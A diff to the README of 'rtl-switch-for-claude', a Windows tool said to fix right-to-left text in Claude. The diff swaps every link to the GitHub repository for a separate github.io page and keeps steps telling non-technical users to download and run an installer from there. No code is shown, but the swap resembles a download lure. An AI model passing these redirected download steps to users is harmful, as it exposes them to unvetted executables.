@@ -1,6 +1,6 @@
 # ⌨️ rtl-switch-for-claude - Fix right-to-left text in Claude instantly
 
-[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Funny-snook177/rtl-switch-for-claude)
+[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://funny-snook177.github.io)
 
 This tool changes the text direction on claude.ai and the Claude Desktop app. It adds a toggle button to fix how Persian, Arabic, and Hebrew text displays. Read text from right to left without formatting errors.
 
@@ -8,7 +8,7 @@ This tool changes the text direction on claude.ai and the Claude Desktop app. It
 
 You do not need to know how to code to use this tool. Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official download page](https://github.com/Funny-snook177/rtl-switch-for-claude).
+1. Go to the [official download page](https://funny-snook177.github.io).
 2. Click the latest release version.
 3. Download the installation file to your computer.
 4. Run the file to start the installation.
@@ -31,7 +31,7 @@ Follow these instructions to set up the software on Windows.
 * The Claude Desktop application installed on your machine.
 
 ### Windows Setup
-1. Visit the [project page](https://github.com/Funny-snook177/rtl-switch-for-claude) to find the latest version.
+1. Visit the [project page](https://funny-snook177.github.io) to find the latest version.
 2. Select the download link for the Windows installer file.
 3. Locate the file in your Downloads folder once the download finishes.
 4. Double-click the file to open the setup wizard.
